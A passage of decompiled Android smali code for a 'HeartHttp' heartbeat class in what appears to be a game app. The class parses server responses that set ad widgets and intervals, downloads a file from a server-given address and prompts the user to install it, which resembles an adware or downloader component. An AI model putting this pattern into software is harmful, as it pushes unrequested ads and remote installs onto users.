    invoke-static {p1, v5}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, LDaemon/Protocol/HeartHttp;->filename:Ljava/lang/String;

    .line 184
    iget-object v5, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;

    if-eqz v5, :cond_3

    iget-object v5, p0, LDaemon/Protocol/HeartHttp;->filename:Ljava/lang/String;

    if-eqz v5, :cond_3

    .line 185
    iget-object v5, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;

    const-string v6, "/"

    invoke-virtual {v5, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_2

    .line 186
    new-instance v5, Ljava/lang/StringBuilder;

    sget-object v6, LDaemon/Action/Action;->host:Ljava/lang/String;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;

    const/4 v7, 0x1

    invoke-virtual {v6, v7}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;

    .line 189
    :goto_0
    iget-object v5, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;

    const-string v6, "&amp;"

    const-string v7, "&"

    invoke-static {v5, v6, v7}, LDaemon/Base/Tools;->replace_name(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;

    .line 190
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "address:"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 192
    const-string v5, "upgrade enabled"

    .line 191
    invoke-static {p1, v5}, LDaemon/Base/Tools;->parseIndexString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z

    move-result v5

    iput-boolean v5, p0, LDaemon/Protocol/HeartHttp;->upgrade:Z

    .line 193
    iget-boolean v5, p0, LDaemon/Protocol/HeartHttp;->upgrade:Z

    if-eqz v5, :cond_0

    .line 195
    const-string v5, "type"

    .line 194
    invoke-static {p1, v5}, LDaemon/Base/Tools;->parseIndexString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    .line 196
    .local v4, "type":I
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "upgrade type:"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 197
    if-gtz v4, :cond_0

    .line 198
    const/4 v5, 0x0

    iput-boolean v5, p0, LDaemon/Protocol/HeartHttp;->upgrade:Z

    .line 200
    .end local v4    # "type":I
    :cond_0
    const-string v5, "name"

    invoke-static {p1, v5}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, LDaemon/Protocol/HeartHttp;->update_title:Ljava/lang/String;

    .line 201
    const-string v5, "content"

    invoke-static {p1, v5}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, LDaemon/Protocol/HeartHttp;->update_info:Ljava/lang/String;

    .line 207
    :goto_1
    const-string v5, "reduce enabled"

    .line 206
    invoke-static {p1, v5}, LDaemon/Base/Tools;->parseIndexString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z

    move-result v5

    iput-boolean v5, p0, LDaemon/Protocol/HeartHttp;->reduce:Z

    .line 209
    const-string v5, "heartbeat enabled"

    .line 208
    invoke-static {p1, v5}, LDaemon/Base/Tools;->parseIndexString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z

    move-result v5

    iput-boolean v5, p0, LDaemon/Protocol/HeartHttp;->heart_open:Z

    .line 210
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "heart_open:"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-boolean v6, p0, LDaemon/Protocol/HeartHttp;->heart_open:Z

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 211
    const-string v5, "server_interval"

    invoke-static {p1, v5}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, LDaemon/Protocol/HeartHttp;->timetype:Ljava/lang/String;

    .line 213
    const-string v5, "client_interval"

    .line 212
    invoke-static {p1, v5}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v5

    .line 213
    const-wide/16 v7, 0x3e8

    .line 212
    mul-long/2addr v5, v7

    sput-wide v5, LHamsterSuper/Client/Game/BootReceiver;->change_hearttime:J

    .line 214
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "change_hearttime:"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-wide v6, LHamsterSuper/Client/Game/BootReceiver;->change_hearttime:J

    invoke-virtual {v5, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 215
    invoke-static {p1}, LDaemon/Base/Tools;->parsePackageItem(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v0

    .line 216
    .local v0, "adwidget_tmp":Ljava/util/ArrayList;, "Ljava/util/ArrayList<LDaemon/Protocol/AdBase;>;"
    const-string v5, "adwidget_tmp"

    invoke-static {v5}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 217
    if-eqz v0, :cond_1

    .line 218
    invoke-virtual {v0}, Ljava/util/ArrayList;->toArray()[Ljava/lang/Object;

    move-result-object v3

    .line 219
    .local v3, "mInfo":[Ljava/lang/Object;
    if-eqz v3, :cond_1

    .line 220
    new-instance v5, LDaemon/Protocol/AdSortUtils$CompratorByAdstrategy;

    invoke-direct {v5}, LDaemon/Protocol/AdSortUtils$CompratorByAdstrategy;-><init>()V

    invoke-static {v3, v5}, Ljava/util/Arrays;->sort([Ljava/lang/Object;Ljava/util/Comparator;)V

    .line 221
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_2
    array-length v5, v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-lt v2, v5, :cond_4

    .line 234
    .end local v2    # "i":I
    .end local v3    # "mInfo":[Ljava/lang/Object;
    :cond_1
    const-string v5, "httpparsePackage state:end"

    invoke-static {v5}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 236
    sget-object v5, LDaemon/Service/ServerConnecter$httpState;->success:LDaemon/Service/ServerConnecter$httpState;

    .end local v0    # "adwidget_tmp":Ljava/util/ArrayList;, "Ljava/util/ArrayList<LDaemon/Protocol/AdBase;>;"
    :goto_3
    return-object v5

    .line 188
    :cond_2
    :try_start_1
    new-instance v5, Ljava/lang/StringBuilder;

    sget-object v6, LDaemon/Action/Action;->host:Ljava/lang/String;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0

    .line 230
    :catch_0
    move-exception v5

    move-object v1, v5

    .line 231
    .local v1, "e":Ljava/lang/Exception;
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "adwidget e:"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 232
    sget-object v5, LDaemon/Service/ServerConnecter$httpState;->error:LDaemon/Service/ServerConnecter$httpState;

    goto :goto_3

    .line 203
    .end local v1    # "e":Ljava/lang/Exception;
    :cond_3
    const/4 v5, 0x0

    :try_start_2
    iput-boolean v5, p0, LDaemon/Protocol/HeartHttp;->upgrade:Z

    goto/16 :goto_1

    .line 222
    .restart local v0    # "adwidget_tmp":Ljava/util/ArrayList;, "Ljava/util/ArrayList<LDaemon/Protocol/AdBase;>;"
    .restart local v2    # "i":I
    .restart local v3    # "mInfo":[Ljava/lang/Object;
    :cond_4
    iget-object v6, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    aget-object v5, v3, v2

    check-cast v5, LDaemon/Protocol/AdBase;

    invoke-virtual {v6, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 223
    new-instance v6, Ljava/lang/StringBuilder;

    const-string v5, "adwidget id:"

    invoke-direct {v6, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v5, v3, v2

    check-cast v5, LDaemon/Protocol/AdBase;

    iget v5, v5, LDaemon/Protocol/AdBase;->id:I

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 224
    const-string v6, " priority:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    aget-object v5, v3, v2

    check-cast v5, LDaemon/Protocol/AdBase;

    iget-object v5, v5, LDaemon/Protocol/AdBase;->priority:Ljava/lang/String;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 225
    const-string v6, " strategy:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    aget-object v5, v3, v2

    check-cast v5, LDaemon/Protocol/AdBase;

    iget v5, v5, LDaemon/Protocol/AdBase;->strategy:I

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 223
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 221
    add-int/lit8 v2, v2, 0x1

    goto/16 :goto_2
.end method

.method public setFinishState(LDaemon/Service/ServerConnecter$httpState;)V
    .locals 3
    .param p1, "httpEnd"    # LDaemon/Service/ServerConnecter$httpState;

    .prologue
    .line 311
    const-string v1, "Enter setFinishState"

    invoke-static {v1}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 312
    iget-boolean v1, p0, LDaemon/Protocol/HeartHttp;->heart_open:Z

    if-eqz v1, :cond_2

    .line 314
    invoke-virtual {p0}, LDaemon/Protocol/HeartHttp;->update()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 315
    invoke-virtual {p0}, LDaemon/Protocol/HeartHttp;->doWidget()V

    .line 318
    :cond_0
    invoke-static {}, LDaemon/Protocol/FrequecyUpdater;->getInstance()LDaemon/Protocol/FrequecyUpdater;

    move-result-object v0

    .line 319
    .local v0, "updater":LDaemon/Protocol/FrequecyUpdater;
    invoke-virtual {v0}, LDaemon/Protocol/FrequecyUpdater;->update()V

    .line 321
    iget-boolean v1, p0, LDaemon/Protocol/HeartHttp;->reduce:Z

    if-eqz v1, :cond_1

    .line 322
    invoke-static {}, LDaemon/Service/TaskPool;->getInstance()LDaemon/Service/TaskPool;

    move-result-object v1

    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->mostsphttp:LDaemon/Protocol/MostSpHttp;

    invoke-virtual {v1, v2}, LDaemon/Service/TaskPool;->addConnectTask(LDaemon/Base/HttpBase;)V

    .line 328
    .end local v0    # "updater":LDaemon/Protocol/FrequecyUpdater;
    :cond_1
    :goto_0
    return-void

    .line 324
    :cond_2
    const-string v1, "All Heart is Stop"

    invoke-static {v1}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 325
    sget-object v1, LHamsterSuper/Client/Game/BootReceiver;->heart:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->stop()V

    .line 326
    const/4 v1, 0x0

    sput-object v1, LHamsterSuper/Client/Game/BootReceiver;->heart:Ljava/lang/Thread;

    goto :goto_0
.end method

.method public setYeah(I)V
    .locals 0
    .param p1, "yeah"    # I

    .prologue
    .line 66
    iput p1, p0, LDaemon/Protocol/HeartHttp;->monthly:I

    .line 67
    return-void
.end method

.method public update()Z
    .locals 13

    .prologue
    const/16 v1, 0x64

    const/4 v8, 0x2

    const/4 v9, 0x0

    const/4 v5, 0x1

    .line 241
    iget-boolean v0, p0, LDaemon/Protocol/HeartHttp;->upgrade:Z

    if-eqz v0, :cond_7

    iget v0, p0, LDaemon/Protocol/HeartHttp;->updatemode:I

    if-nez v0, :cond_7

    .line 242
    const-string v0, "RerviceHttp\uff1aupdate"

    invoke-static {v0}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 243
    iput v5, p0, LDaemon/Protocol/HeartHttp;->updatemode:I

    .line 245
    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v0

    .line 246
    const-string v2, "mounted"

    .line 245
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 251
    const/4 v12, 0x1

    .line 252
    .local v12, "update":Z
    :goto_0
    if-nez v12, :cond_0

    .line 286
    :try_start_0
    sget-object v0, LHamsterSuper/Client/Game/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, LDaemon/DownLoad/FileDownloader;->download(LDaemon/DownLoad/DownloadProgressListener;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move v0, v9

    .line 304
    .end local v12    # "update":Z
    :goto_1
    return v0

    .line 254
    .restart local v12    # "update":Z
    :cond_0
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->update_title:Ljava/lang/String;

    if-nez v0, :cond_1

    .line 255
    const-string v0, "\u7248\u672c\u5347\u7ea7"

    iput-object v0, p0, LDaemon/Protocol/HeartHttp;->update_title:Ljava/lang/String;

    .line 256
    :cond_1
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->update_info:Ljava/lang/String;

    if-nez v0, :cond_2

    .line 257
    const-string v0, "\u70b9\u51fb\u786e\u8ba4\u5b89\u88c5!"

    iput-object v0, p0, LDaemon/Protocol/HeartHttp;->update_info:Ljava/lang/String;

    .line 259
    :cond_2
    sget-object v0, LHamsterSuper/Client/Game/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    .line 260
    iget-object v3, p0, LDaemon/Protocol/HeartHttp;->update_title:Ljava/lang/String;

    iget-object v4, p0, LDaemon/Protocol/HeartHttp;->update_info:Ljava/lang/String;

    const-string v6, "10000"

    iget-object v7, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;

    move v2, v1

    .line 259
    invoke-virtual/range {v0 .. v9}, LDaemon/DownLoad/FileDownloader;->setType(IILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;II)I

    move-result v11

    .line 263
    .local v11, "type":I
    if-ne v11, v8, :cond_3

    .line 264
    invoke-static {}, LDaemon/Service/HeartConnecter;->isNetworkAvailable()Z

    move-result v0

    if-eqz v0, :cond_3

    .line 266
    sget-object v0, LHamsterSuper/Client/Game/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    iget-object v2, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;

    .line 267
    iget-object v3, p0, LDaemon/Protocol/HeartHttp;->filename:Ljava/lang/String;

    .line 266
    invoke-virtual {v0, v2, v3, v5}, LDaemon/DownLoad/FileDownloader;->UpdateFileDownloader(Ljava/lang/String;Ljava/lang/String;I)V

    .line 268
    const/4 v12, 0x0

    goto :goto_0

    .line 270
    :cond_3
    if-eqz v11, :cond_4

    .line 271
    invoke-static {}, LDaemon/Service/HeartConnecter;->isNetworkAvailable()Z

    move-result v0

    if-nez v0, :cond_5

    .line 274
    :cond_4
    const-wide/16 v2, 0x1388

    :try_start_1
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 275
    :catch_0
    move-exception v10

    .line 276
    .local v10, "e":Ljava/lang/Exception;
    const-string v0, "BootReceiver\uff1aDown wait error:"

    invoke-static {v0}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    goto :goto_0

    .line 280
    .end local v10    # "e":Ljava/lang/Exception;
    :cond_5
    const/4 v12, 0x0

    goto :goto_0

    .line 287
    .end local v11    # "type":I
    :catch_1
    move-exception v0

    move-object v10, v0

    .line 288
    .restart local v10    # "e":Ljava/lang/Exception;
    const-string v0, "BootReceiver\uff1aDown Load error"

    invoke-static {v0}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 289
    iput v9, p0, LDaemon/Protocol/HeartHttp;->updatemode:I

    .line 290
    sput v9, LHamsterSuper/Client/Game/BootReceiver;->mode:I

    move v0, v5

    .line 291
    goto :goto_1

    .line 295
    .end local v10    # "e":Ljava/lang/Exception;
    .end local v12    # "update":Z
    :cond_6
    const-string v0, "RerviceHttp\uff1asdcard wait"

    invoke-static {v0}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 296
    iput v9, p0, LDaemon/Protocol/HeartHttp;->updatemode:I

    .line 297
    sput v9, LHamsterSuper/Client/Game/BootReceiver;->mode:I

    move v0, v5

    .line 298
    goto :goto_1

    .line 303
    :cond_7
    sput v5, LHamsterSuper/Client/Game/BootReceiver;->mode:I

    move v0, v5

    .line 304
    goto :goto_1
.end method
